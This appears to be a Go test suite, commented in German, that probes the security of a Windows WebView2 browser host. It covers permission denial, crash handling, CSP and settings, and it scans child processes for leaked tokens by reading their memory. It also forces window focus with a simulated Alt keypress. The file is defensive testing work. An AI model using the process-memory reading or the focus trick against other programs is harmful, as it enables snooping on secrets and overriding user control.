  navigator.geolocation.getCurrentPosition(function(){ send("geo", {code: 0}); status("geo_status2"); }, function(e){ send("geo", {code: e.code}); status("geo_status2"); }, {timeout: 6000});
  setTimeout(function(){ send("geo_frist", {}); }, 10000);
});
`, "geo ", 3, false, false,
			func(t *testing.T, n, denied int, trace []string) {
				if b.gw.has(`"code":0`) || b.gw.has(`"state":"granted"`) {
					t.Fatalf("FUND: Die Seite hat den Standort oder die Erlaubnis dafür bekommen: %v", b.gw.snapshot())
				}
				if n > 0 && denied != n {
					t.Fatalf("PermissionRequested art=3 nicht abgelehnt: %v", trace)
				}
				if n == 0 {
					t.Logf("geolocation: Browser verweigert selbst (kein PermissionRequested); die Seite erhielt nichts, die Ereignis-Sperre ist hier nicht belegt")
				} else {
					t.Logf("geolocation: Ereignis lehnt ab (%d-mal)", n)
				}
			}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				if tc.clip {
					if err := setClipboardText(marker); err != nil {
						t.Fatalf("Zwischenablage setzen: %v", err)
					}
					b.closers = append(b.closers, clearClipboard)
					if got := getClipboardText(); got != marker {
						t.Fatalf("Kontrolle blind: Die Zwischenablage des Gasts trägt den synthetischen Wert nicht")
					}
				}
				s, _, trace := b.openProbe("probe", map[string]string{
					"index.html": probePage(`<script src="probe.js"></script><script src="marker.js"></script>`, `<script src="rechte.js"></script>`),
					"marker.js":  `window.MARKER = "` + marker + `";`,
					"rechte.js":  tc.js,
					"probe.js":   probeJS,
				}, func(c *SurfaceConfig) { c.allowPermissions = tc.allow })
				forceForeground(t, s.hwnd) // der Fokus gehört der Seite; ohne Vordergrund fragen Zwischenablage und Standort nicht
				s.Focus()
				answered := func() bool {
					return b.gw.has(tc.ready) || b.gw.has("kein_klick") || (tc.name == "geolocation" && b.gw.has("geo_frist"))
				}
				frist := 20 * time.Second
				if tc.clip || tc.name == "geolocation" {
					frist = 40 * time.Second // der Host klickt im Sekundentakt auf die Fläche
					t.Logf("%s: Die Sonde wartet bis zu 25 s auf einen Klick oder eine Taste des Hosts (Ziel siehe Spur 'Fenster … flaeche_mitte_bildschirm')", tc.name)
				}
				if !pump(t, s, frist, answered) {
					t.Fatalf("%s: keine Antwort der Seite innerhalb der Frist", tc.name)
				}
				if b.gw.has("kein_klick") {
					t.Fatalf("%s: kein Klick, unbelegt (die Seite wartete 25 s auf einen Klick in die Fläche; Vordergrund und Fokus siehe Protokoll). Seite meldet: %v", tc.name, b.gw.snapshot())
				}
				if b.gw.has("klick ") {
					t.Logf("%s: Aktivierung angekommen (%s), document.hasFocus() im Handler: %v", tc.name, b.gw.matching("klick "), b.gw.has(`"hat":true`))
				}
				if tc.name == "geolocation" {
					pump(t, s, 500*time.Millisecond, nil) // geo_status2 nach dem Rückruf
					consent := logLocationConsent(t)
					if !b.gw.has("geo ") {
						t.Fatalf("Geolocation unbelegt: kein Rückruf der Seite innerhalb der Frist, kein PermissionRequested art=3 (Zeitablauf ist kein Beleg; Standort-Einwilligung des Systems: %q). Seite meldet: %v", consent, b.gw.snapshot())
					}
					if consent == "Allow" {
						// Ist der Standort im System erlaubt, muss die Abfrage den Browser erreichen und vom Ereignis abgelehnt werden.
						if n, denied := asked(*trace, 3); n == 0 || denied != n {
							t.Fatalf("Standort im System erlaubt, aber PermissionRequested art=3 kam %d-mal und wurde %d-mal abgelehnt: %v", n, denied, *trace)
						}
						if !b.gw.has(`"code":1`) {
							t.Fatalf("Standort im System erlaubt, abgelehnt, aber die Seite bekam nicht PERMISSION_DENIED: %v", b.gw.snapshot())
						}
					}
				}
				n, denied := asked(*trace, tc.art)
				t.Logf("%s: PermissionRequested art=%d gemeldet %d-mal, davon abgelehnt %d; Seite: %v", tc.name, tc.art, n, denied, b.gw.snapshot())
				tc.check(t, n, denied, *trace)
			})
		})
	}
}

var (
	kernel32Clip      = windows.NewLazySystemDLL("kernel32.dll")
	pGlobalAlloc      = kernel32Clip.NewProc("GlobalAlloc")
	pGlobalLock       = kernel32Clip.NewProc("GlobalLock")
	pGlobalUnlock     = kernel32Clip.NewProc("GlobalUnlock")
	pOpenClipboard    = user32.NewProc("OpenClipboard")
	pCloseClipboard   = user32.NewProc("CloseClipboard")
	pEmptyClipboard   = user32.NewProc("EmptyClipboard")
	pSetClipboardData = user32.NewProc("SetClipboardData")
	pGetClipboardData = user32.NewProc("GetClipboardData")
)

const (
	cfUnicodeText = 13
	gmemMoveable  = 0x2
)

// setClipboardText legt einen synthetischen Text in die Zwischenablage des Gasts (nie echte Daten).
func setClipboardText(text string) error {
	u := windows.StringToUTF16(text)
	size := uintptr(len(u) * 2)
	h, _, _ := pGlobalAlloc.Call(gmemMoveable, size)
	if h == 0 {
		return errors.New("GlobalAlloc")
	}
	ptr, _, _ := pGlobalLock.Call(h)
	if ptr == 0 {
		return errors.New("GlobalLock")
	}
	copy(unsafe.Slice((*uint16)(ptrOf(ptr)), len(u)), u)
	pGlobalUnlock.Call(h)
	if r, _, _ := pOpenClipboard.Call(0); r == 0 {
		return errors.New("OpenClipboard")
	}
	defer pCloseClipboard.Call()
	pEmptyClipboard.Call()
	if r, _, _ := pSetClipboardData.Call(cfUnicodeText, h); r == 0 {
		return errors.New("SetClipboardData")
	}
	return nil
}

func getClipboardText() string {
	if r, _, _ := pOpenClipboard.Call(0); r == 0 {
		return ""
	}
	defer pCloseClipboard.Call()
	h, _, _ := pGetClipboardData.Call(cfUnicodeText)
	if h == 0 {
		return ""
	}
	ptr, _, _ := pGlobalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer pGlobalUnlock.Call(h)
	return windows.UTF16PtrToString((*uint16)(ptrOf(ptr)))
}

func clearClipboard() {
	if r, _, _ := pOpenClipboard.Call(0); r != 0 {
		pEmptyClipboard.Call()
		pCloseClipboard.Call()
	}
}

// ProcessFailed (B1): Stirbt der Browserprozess, schließt das Fenster, der Host ist zu und der Test-Prozess lebt.
func TestWindowsWebViewProzessabsturz(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		closed := false
		s, o, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="lebt.js"></script>`),
			"lebt.js":    `send("lebt", {});`,
			"probe.js":   probeJS,
		}, func(c *SurfaceConfig) { c.OnClosed = func() { closed = true } })
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("lebt") }) {
			t.Fatal("Seite lädt nicht")
		}
		killed := 0
		for _, p := range webviewProcesses(t) {
			h, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, p.pid)
			if err == nil {
				_ = windows.TerminateProcess(h, 1)
				_ = windows.CloseHandle(h)
				killed++
			}
		}
		if killed == 0 {
			t.Fatal("kein msedgewebview2-Prozess unter dem Test gefunden (Kontrolle blind)")
		}
		if !pump(t, nil, 20*time.Second, func() bool { return closed }) {
			t.Fatal("Fenster blieb nach dem Absturz stehen")
		}
		if !o.Host.Closed() {
			t.Fatal("Host nach Absturz nicht geschlossen")
		}
	})
}

// Prozessbaum (SEC (a), (b)): Weder Umgebung noch Kommandozeile irgendeines msedgewebview2-Prozesses unter
// dem Prozess, der das Token hält, tragen einen Träger, einen JNPT*-Variablennamen oder den Pipe-Namen; der
// echte Produktpfad des Benutzerdatenverzeichnisses trägt kein jnpt. Der öffentliche Hostname *.jnpt.invalid
// (virtueller Host, kein Geheimnis) wird nur als solcher ausgenommen und gezählt, jedes andere jnpt ist ein Fund.
// Kontrolle: Vor dem Start stehen JNPT*-Variablen mit tokenförmigem Wert in der Umgebung des Testprozesses; die
// Bereinigung des Produkts muss sie entfernen, sonst würden die Kindprozesse sie erben.
func TestWindowsWebViewProzessbaumOhneTraeger(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		const fakeToken = "jn" + "ptpc_" + "SONDENWERT0123456789"
		os.Setenv("JNPT_SONDE_TRAEGER", fakeToken)
		os.Setenv("jnpt_sonde_klein", "x")
		s, o, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="baum.js"></script>`),
			"baum.js":    `send("baum", {});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("baum") }) {
			t.Fatal("Seite lädt nicht")
		}
		if os.Getenv("JNPT_SONDE_TRAEGER") != "" {
			t.Fatal("Die Bereinigung des Produkts hat JNPT_SONDE_TRAEGER nicht aus der Umgebung entfernt")
		}
		procs := webviewProcesses(t)
		if len(procs) == 0 {
			t.Fatal("kein msedgewebview2-Prozess gefunden: Die Sonde wäre blind")
		}
		hostnames, netArgs := 0, 0
		for _, p := range procs {
			t.Logf("Prozess %d (%s): Kommandozeile %d Zeichen, Umgebung %d Zeichen, Variablen JNPT*: %v", p.pid, p.name, len(p.cmdline), len(p.env), jnptNames(strings.Split(p.env, "\x00")))
			for part, text := range map[string]string{"Kommandozeile": p.cmdline, "Umgebung": p.env} {
				if fenster.EnthaeltTraeger([]byte(text)) || strings.Contains(strings.ToLower(text), strings.ToLower(fakeToken)) || strings.Contains(strings.ToLower(text), "bearer") {
					t.Errorf("Prozess %d (%s) trägt in der %s einen Träger", p.pid, p.name, part)
				}
				if strings.Contains(strings.ToLower(text), "bedienfeld") {
					t.Errorf("Prozess %d kennt in der %s den Pipe-Namen", p.pid, part)
				}
				rest := strings.ReplaceAll(strings.ToLower(text), ".jnpt.invalid", "")
				hostnames += strings.Count(strings.ToLower(text), ".jnpt.invalid")
				for i := 0; i < len(rest); {
					j := strings.Index(rest[i:], "jnpt")
					if j < 0 {
						break
					}
					at := i + j
					lo, hi := max(0, at-30), min(len(rest), at+30)
					t.Errorf("Prozess %d (%s): jnpt in der %s: ...%s...", p.pid, p.name, part, fenster.DiagText(rest[lo:hi]))
					i = at + 4
				}
			}
			if strings.Contains(p.cmdline, "--proxy-server=http://0.0.0.0:0") {
				netArgs++
			}
		}
		t.Logf("Hostname *.jnpt.invalid kam %d-mal in Kommandozeilen und Umgebungen vor (ausgenommen)", hostnames)
		if netArgs == 0 {
			t.Errorf("kein Browserprozess trägt die Argumente von Schicht 2 (%s): Sie kommen nicht an", fenster.BrowserArguments)
		}
		root, err := platform.Root()
		if err != nil {
			t.Fatal(err)
		}
		product, err := UserDataDir(root, "probe")
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(strings.ToLower(product), "jnpt") {
			t.Fatalf("Produktpfad des Benutzerdatenverzeichnisses trägt jnpt: %s", fenster.DiagText(product))
		}
		if strings.Contains(strings.ToLower(o.UserDataDir), "jnpt") {
			t.Fatal("Benutzerdatenverzeichnis der Sonde trägt jnpt im Pfad")
		}
	})
}

// ClearBrowsingData (A5): löscht Cookies/Speicher des Profils; die Antwort kommt im UI-Thread.
func TestWindowsWebViewClearBrowsingData(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html":  probePage(`<script src="probe.js"></script>`, `<script src="speicher.js"></script>`),
			"speicher.js": `localStorage.setItem("k", "v"); send("gesetzt", {v: localStorage.getItem("k")});`,
			"probe.js":    probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("gesetzt") }) {
			t.Fatal("Seite lädt nicht")
		}
		ok := make(chan bool, 1)
		if err := s.ClearBrowsingData(func(good bool) { ok <- good }); err != nil {
			t.Fatalf("ClearBrowsingData: %v", err)
		}
		var good bool
		if !pump(t, s, 20*time.Second, func() bool {
			select {
			case good = <-ok:
				return true
			default:
				return false
			}
		}) || !good {
			t.Fatal("ClearBrowsingData meldet keinen Erfolg")
		}
	})
}

// --- Hilfen: Fenster zählen, msedgewebview2-Prozesse unter dem Test samt Umgebung und Kommandozeile

var (
	pEnumWindows = user32.NewProc("EnumWindows")
	pClassName   = user32.NewProc("GetClassNameW")
	pWindowPID   = user32.NewProc("GetWindowThreadProcessId")
)

func topLevelWindows(t *testing.T) int {
	t.Helper()
	n := 0
	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		var buf [64]uint16
		pClassName.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 64)
		var pid uint32
		pWindowPID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
		if pid == windows.GetCurrentProcessId() && windows.UTF16ToString(buf[:]) == className {
			n++
		}
		return 1
	})
	pEnumWindows.Call(cb, 0)
	return n
}

type procInfo struct {
	pid     uint32
	name    string
	cmdline string
	env     string
}

// webviewProcesses liefert alle msedgewebview2.exe-Nachfahren dieses Prozesses mit Kommandozeile und Umgebung (PEB).
func webviewProcesses(t *testing.T) []procInfo {
	t.Helper()
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		t.Fatal(err)
	}
	defer windows.CloseHandle(snap)
	parent := map[uint32]uint32{}
	names := map[uint32]string{}
	var e windows.ProcessEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	for err = windows.Process32First(snap, &e); err == nil; err = windows.Process32Next(snap, &e) {
		parent[e.ProcessID] = e.ParentProcessID
		names[e.ProcessID] = windows.UTF16ToString(e.ExeFile[:])
	}
	self := windows.GetCurrentProcessId()
	var out []procInfo
	for pid, name := range names {
		if !strings.EqualFold(name, "msedgewebview2.exe") || !descends(parent, pid, self) {
			continue
		}
		cmd, env := readPEB(t, pid)
		out = append(out, procInfo{pid, name, cmd, env})
	}
	return out
}

func descends(parent map[uint32]uint32, pid, root uint32) bool {
	for i := 0; i < 16 && pid != 0; i++ {
		pid = parent[pid]
		if pid == root {
			return true
		}
	}
	return false
}

func readPEB(t *testing.T, pid uint32) (cmdline, env string) {
	t.Helper()
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		t.Fatalf("OpenProcess %d: %v", pid, err)
	}
	defer windows.CloseHandle(h)
	var info windows.PROCESS_BASIC_INFORMATION
	if err = windows.NtQueryInformationProcess(h, 0, unsafe.Pointer(&info), uint32(unsafe.Sizeof(info)), nil); err != nil {
		t.Fatal(err)
	}
	read := func(addr uintptr, dst unsafe.Pointer, size uintptr) {
		if err := windows.ReadProcessMemory(h, addr, (*byte)(dst), size, nil); err != nil {
			t.Fatalf("ReadProcessMemory %d: %v", pid, err)
		}
	}
	var peb windows.PEB
	read(uintptr(unsafe.Pointer(info.PebBaseAddress)), unsafe.Pointer(&peb), unsafe.Sizeof(peb))
	var params windows.RTL_USER_PROCESS_PARAMETERS
	read(uintptr(unsafe.Pointer(peb.ProcessParameters)), unsafe.Pointer(&params), unsafe.Sizeof(params))
	cmd := make([]uint16, int(params.CommandLine.Length)/2)
	if len(cmd) > 0 {
		read(uintptr(unsafe.Pointer(params.CommandLine.Buffer)), unsafe.Pointer(&cmd[0]), uintptr(len(cmd)*2))
	}
	var envText []rune
	if params.EnvironmentSize > 0 && params.EnvironmentSize < 1<<20 {
		raw := make([]uint16, params.EnvironmentSize/2)
		read(uintptr(params.Environment), unsafe.Pointer(&raw[0]), params.EnvironmentSize)
		for _, c := range raw {
			envText = append(envText, rune(c))
		}
	}
	return windows.UTF16ToString(cmd), string(envText)
}

// VM-Befund: Ohne COM auf dem Thread scheitert die Umgebung mit „CoInitialize wurde nicht aufgerufen“. Der Adapter
// prüft den Thread vor dem Start und meldet den festen Fehler; kein Hänger, kein Fenster, kein Prozessende.
func TestWindowsWebViewOhneCOMOeffnetNicht(t *testing.T) {
	b := newProbeBed(t)
	done := make(chan error, 1)
	go func() {
		runtime.LockOSThread() // bewusst ohne EnterUI
		done <- b.openOhneCOM(false)
	}()
	select {
	case err := <-done:
		if !errors.Is(err, ErrWebView) {
			t.Fatalf("erwartet den festen Fehler, bekam %v", err)
		}
		var se *StepError
		if !errors.As(err, &se) || se.Step != "com apartment" {
			t.Fatalf("scheitert am falschen Schritt: %v", se)
		}
	case <-time.After(probeFrist):
		t.Fatal("Sonde hängt")
	}
	if n := openSurfaces(); n != 0 {
		t.Fatalf("%d Fenster nach dem Fehlstart", n)
	}
}

// Erzwungener Fehlstart: Die Prüfung des Threads ist abgeschaltet, die Umgebung scheitert wirklich in WebView2
// (so wie auf der VM). NewSurface muss in kurzer Zeit mit dem festen Fehler enden, ein Fenster bleibt zu, und
// dieselbe Oberfläche (derselbe Thread) bleibt danach bedienbar: Nachrichten werden weiter verteilt.
func TestWindowsWebViewFehlstartHaengtNicht(t *testing.T) {
	b := newProbeBed(t)
	type result struct {
		err     error
		elapsed time.Duration
		pumped  bool
	}
	done := make(chan result, 1)
	go func() {
		runtime.LockOSThread()
		start := time.Now()
		err := b.openOhneCOM(true)
		elapsed := time.Since(start)
		pumped := pump(t, nil, 200*time.Millisecond, nil) // läuft zurück, ohne zu blockieren
		done <- result{err, elapsed, pumped}
	}()
	select {
	case r := <-done:
		if !errors.Is(r.err, ErrWebView) {
			t.Fatalf("erwartet den festen Fehler, bekam %v", r.err)
		}
		var se *StepError
		if !errors.As(r.err, &se) || se.Step != "embed wait" {
			t.Fatalf("Die Umgebung ist nicht im Schritt embed wait gescheitert (der Fehlstart wurde nicht erzwungen): %v", se)
		}
		if r.elapsed > startFrist+5*time.Second {
			t.Fatalf("Fehlstart dauerte %v (Grenze %v)", r.elapsed, startFrist)
		}
		if !r.pumped {
			t.Fatal("Nachrichtenverteilung nach dem Fehlstart blockiert")
		}
	case <-time.After(probeFrist):
		t.Fatal("Sonde hängt: NewSurface kehrt bei scheiternder Umgebung nicht zurück (Halt wäre blockiert)")
	}
	if n := openSurfaces(); n != 0 {
		t.Fatalf("%d Fenster nach dem Fehlstart", n)
	}
}

// openOhneCOM öffnet ein Fenster auf einem Thread, der COM nicht initialisiert hat.
func (b *probeBed) openOhneCOM(ohnePruefung bool) error {
	host, err := NewHost(HostConfig{App: "probe", Gateway: b.gw, Lokal: probeLokal{}, Wake: func() {}})
	if err != nil {
		return err
	}
	dir, err := os.MkdirTemp("", "jnpt-probe-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(dir)
	if err := os.WriteFile(filepath.Join(dir, "index.html"), []byte(probePage("", "x")), 0o600); err != nil {
		return err
	}
	o := &Opened{Name: "probe", Dir: dir, UserDataDir: filepath.Join(dir, "webview"), Host: host}
	s, err := NewSurface(o, SurfaceConfig{noThreadCheck: ohnePruefung})
	if err == nil {
		s.Close()
	}
	return err
}

func openSurfaces() int {
	surfacesMu.Lock()
	defer surfacesMu.Unlock()
	return len(surfaces)
}

// removeWhenFree löscht den Datenordner des Browsers, sobald dessen Prozesse die Dateien freigeben. Gelingt es
// nicht, ist das ein Hinweis (der Widerruf des Läufers löscht ihn dann beim nächsten Versuch), kein Sondenfehler.
func removeWhenFree(t *testing.T, dir string) {
	var err error
	for i := 0; i < 40; i++ {
		if err = os.RemoveAll(dir); err == nil {
			return
		}
		time.Sleep(250 * time.Millisecond)
	}
	t.Logf("Hinweis: Datenordner nach 10 s noch gesperrt (%v)", err)
}

// CSP in der Praxis: Ein Inline-Skript läuft nicht (script-src 'self'), ein Skript als Datei schon. Das ist die
// Kontrolle dafür, dass die übrigen Sonden ihre Auslöser als Dateien liefern müssen.
func TestWindowsWebViewInlineSkriptBlockiert(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script>send("inline", {});</script><script src="datei.js"></script>`),
			"probe.js":   probeJS,
			"datei.js":   `send("datei", {});`,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("datei ") }) {
			t.Fatal("Skript als Datei läuft nicht: Die Seite lädt nicht oder die Brücke antwortet nicht")
		}
		pump(t, s, time.Second, nil)
		if b.gw.has("inline ") {
			t.Fatal("Inline-Skript lief trotz CSP")
		}
	})
}

// SEC Bedingung 3 am echten WebView2: Scheitert der Controller-Start (Elternfenster 0 gibt es nicht), meldet die
// Kopie den ersten Fehler an den Aufrufer, statt den Prozess zu beenden oder zu hängen. Der Test-Prozess lebt
// danach, und die Nachrichtenverteilung läuft weiter.
func TestWindowsEdgeControllerFehlerBleibtFehler(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		dir, err := os.MkdirTemp("", "jnpt-probe-")
		if err != nil {
			t.Fatal(err)
		}
		b.closers = append(b.closers, func() { removeWhenFree(t, dir) })
		c := edge.NewChromium()
		var reported []string
		c.SetErrorCallback(func(err error) { reported = append(reported, fenster.DiagText(err.Error())) })
		c.DataPath = filepath.Join(dir, "webview")
		if err := c.Begin(0); err != nil {
			t.Logf("Begin meldet sofort: %v (auch ein fester Fehler beim Aufrufer)", err)
			return
		}
		s := &Surface{}
		start := time.Now()
		err = WaitFor(startFrist, s.pumpOnce, c.Ready)
		c.Cancel()
		t.Logf("Ergebnis nach %v: %v; Fehlerrückrufe: %v", time.Since(start), err, reported)
		if err == nil {
			c.Close()
			t.Fatal("Controller mit Elternfenster 0 wurde angenommen: Die Sonde kann den Fehlerpfad nicht erzwingen")
		}
		if errors.Is(err, ErrStartFrist) {
			t.Fatalf("keine Rückmeldung innerhalb %v: Der Fehler kam nicht als Fehler an", startFrist)
		}
		if !pump(t, nil, 200*time.Millisecond, nil) {
			t.Fatal("Nachrichtenverteilung blockiert nach dem Fehler")
		}
	})
}

// Belegt am Prozess, dass die Momentaufnahme vor dem Paket-Init des Go-Laders läuft: Sie enthält keine
// WEBVIEW2_*-Variable (Sondenlauf 6: im Gast ist keine gesetzt), die Umgebung jetzt aber schon die fünf neutralen
// Werte, die der Lader setzt. Steht beim Start etwas drin, ist das ein Eingriff oder die Reihenfolge ist verletzt;
// die Ausgabe nennt nur Namen und Wertlängen.
func TestWindowsEnvMomentaufnahmeVorLader(t *testing.T) {
	if !probeOptIn {
		t.Skip("opt-in: JNPT_NATIVE_WEBVIEW_PROBE=1")
	}
	if findings := webview2Findings(envsnap.Start(), nil); len(findings) != 0 {
		t.Fatalf("beim Start gesetzt (Eingriff, oder die Momentaufnahme lief nach dem Lader-Init): %v", findings)
	}
	have := map[string]string{}
	for _, kv := range os.Environ() {
		name, value, _ := strings.Cut(kv, "=")
		if isWebView2(name) {
			have[strings.ToUpper(name)] = value
		}
	}
	for name, want := range loaderNeutral {
		got, ok := have[name]
		if !ok || got != want {
			t.Errorf("Der Lader-Init hat %s nicht neutral gesetzt (vorhanden=%v, laenge=%d)", name, ok, len(got))
		}
	}
	if findings := webview2Findings(envsnap.Start(), os.Environ()); len(findings) != 0 {
		t.Errorf("Eingriffe jetzt: %v", findings)
	}
}

// ptrOf macht aus einer von Windows gelieferten Adresse einen Zeiger (go vet kennt den Ursprung nicht).
func ptrOf(u uintptr) unsafe.Pointer { return *(*unsafe.Pointer)(unsafe.Pointer(&u)) }

var (
	pKeybd         = user32.NewProc("keybd_event")
	pGetForeground = user32.NewProc("GetForegroundWindow")
)

// forceForeground bringt das Fenster der Sonde in den Vordergrund, auch aus einem Hintergrundprozess (nur Sonde,
// nie im Produkt). SetForegroundWindow scheitert dort oft; der übliche Weg ist, vorher kurz die Alt-Taste zu
// drücken. Das Ergebnis wird protokolliert, denn ohne Vordergrund hat die Seite keinen Fokus und Zwischenablage
// und Standort fragen gar nicht erst.
func forceForeground(t *testing.T, hwnd uintptr) {
	t.Helper()
	const vkMenu, keyUp = 0x12, 0x2
	pShow.Call(hwnd, swRestore)
	if pForeground.Call(hwnd); isForeground(hwnd) {
		return
	}
	pKeybd.Call(vkMenu, 0, 0, 0)
	pForeground.Call(hwnd)
	pKeybd.Call(vkMenu, 0, keyUp, 0)
	t.Logf("Vordergrund nach Alt-Trick: %v", isForeground(hwnd))
}

func isForeground(hwnd uintptr) bool {
	h, _, _ := pGetForeground.Call()
	return h == hwnd
}

// Pixel-Beleg (Lauf 12): Nicht nur der Zustand der Seite, auch das Bild. Die Seite füllt die Fläche mit einer großen
// Farbe, die Sonde liest im Bildschirmbild die Mitte der Fläche. Zwei verschiedene Farben als Kontrolle, dass die
// Sonde Änderungen sieht (kein Zufallstreffer auf Weiß oder die Fensterfarbe).
func TestWindowsWebViewSichtbarMitFarbe(t *testing.T) {
	b := newProbeBed(t)
	for _, c := range []struct {
		name     string
		css      string
		r, g, b8 uint8
	}{
		{"magenta", "#ff00ff", 255, 0, 255},
		{"gruen", "#00aa00", 0, 170, 0},
	} {
		t.Run(c.name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				s, _, _ := b.openProbe("probe", map[string]string{
					"index.html": probePage(`<script src="probe.js"></script><link rel="stylesheet" href="farbe.css">`, `<script src="gemalt.js"></script>`),
					"farbe.css":  "html, body { margin: 0; height: 100%; background: " + c.css + "; }",
					"gemalt.js":  `requestAnimationFrame(function(){ requestAnimationFrame(function(){ send("gemalt", {}); }); });`,
					"probe.js":   probeJS,
				}, nil)
				forceForeground(t, s.hwnd)
				if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("gemalt") }) {
					t.Fatal("die Seite hat nicht gemalt (requestAnimationFrame lief nie; sichtbar?)")
				}
				pump(t, s, time.Second, nil) // das Bild auf den Schirm kommen lassen
				x, y := s.viewCenterScreen()
				got := screenPixel(x, y)
				r, g, bl := uint8(got&0xff), uint8((got>>8)&0xff), uint8((got>>16)&0xff)
				t.Logf("Pixel in der Mitte der Fläche (%d,%d): RGB(%d,%d,%d), erwartet RGB(%d,%d,%d); Vordergrund: %v", x, y, r, g, bl, c.r, c.g, c.b8, isForeground(s.hwnd))
				near := func(a, e uint8) bool { return int(a)-int(e) < 12 && int(e)-int(a) < 12 }
				if !near(r, c.r) || !near(g, c.g) || !near(bl, c.b8) {
					t.Fatalf("Die Farbe %s ist nicht im Bild: RGB(%d,%d,%d)", c.name, r, g, bl)
				}
			})
		})
	}
}

var (
	gdi32      = windows.NewLazySystemDLL("gdi32.dll")
	pGetPixel  = gdi32.NewProc("GetPixel")
	pGetDC     = user32.NewProc("GetDC")
	pReleaseDC = user32.NewProc("ReleaseDC")
)

// screenPixel liest die Farbe (COLORREF 0x00BBGGRR) eines Bildschirmpunkts; 0xFFFFFFFF, wenn er nicht lesbar ist.
func screenPixel(x, y int32) uint32 {
	dc, _, _ := pGetDC.Call(0)
	if dc == 0 {
		return 0xFFFFFFFF
	}
	defer pReleaseDC.Call(0, dc)
	c, _, _ := pGetPixel.Call(dc, uintptr(x), uintptr(y))
	return uint32(c)
}

// SEC-R4 F4: applySettings prüft nur das HRESULT. Die Sonde liest alle Werte aus fenster.Settings() zurück, damit ein
// Versatz in der zusammengelegten Vtable von ICoreWebViewSettings auffällt (ein Setter, der auf den falschen Eintrag
// schreibt, liefert S_OK).
func TestWindowsWebViewEinstellungenZurueckgelesen(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, ``),
			"probe.js":   probeJS,
		}, nil)
		st, err := s.chromium.GetSettings()
		if err != nil || st == nil {
			t.Fatalf("keine Einstellungen: %v", err)
		}
		s4 := st.GetICoreWebView2Settings4()
		if s4 == nil {
			t.Fatal("ICoreWebView2Settings4 fehlt: Autofill und Passwortspeicher ließen sich nicht setzen")
		}
		getters := map[string]func() (bool, error){
			"AreBrowserAcceleratorKeysEnabled": st.GetAreBrowserAcceleratorKeysEnabled,
			"AreDefaultContextMenusEnabled":    st.GetAreDefaultContextMenusEnabled,
			"AreDefaultScriptDialogsEnabled":   st.GetAreDefaultScriptDialogsEnabled,
			"AreDevToolsEnabled":               st.GetAreDevToolsEnabled,
			"AreHostObjectsAllowed":            st.GetAreHostObjectsAllowed,
			"IsBuiltInErrorPageEnabled":        st.GetIsBuiltInErrorPageEnabled,
			"IsGeneralAutofillEnabled":         s4.GetIsGeneralAutofillEnabled,
			"IsPasswordAutosaveEnabled":        s4.GetIsPasswordAutosaveEnabled,
			"IsPinchZoomEnabled":               st.GetIsPinchZoomEnabled,
			"IsScriptEnabled":                  st.GetIsScriptEnabled,
			"IsStatusBarEnabled":               st.GetIsStatusBarEnabled,
			"IsSwipeNavigationEnabled":         st.GetIsSwipeNavigationEnabled,
			"IsWebMessageEnabled":              st.GetIsWebMessageEnabled,
			"IsZoomControlEnabled":             st.GetIsZoomControlEnabled,
		}
		read := 0
		for _, want := range fenster.Settings() {
			get := getters[want.Name]
			if get == nil {
				t.Fatalf("kein Leser für %s: Die Sonde deckt die Sollliste nicht ab", want.Name)
			}
			got, err := get()
			if err != nil {
				t.Errorf("%s nicht lesbar: %v", want.Name, err)
				continue
			}
			read++
			if got != want.An {
				t.Errorf("%s ist %v, Soll %v", want.Name, got, want.An)
			}
		}
		t.Logf("%d Einstellungen zurückgelesen", read)
		if read != len(fenster.Settings()) {
			t.Errorf("nur %d von %d Einstellungen gelesen", read, len(fenster.Settings()))
		}
	})
}
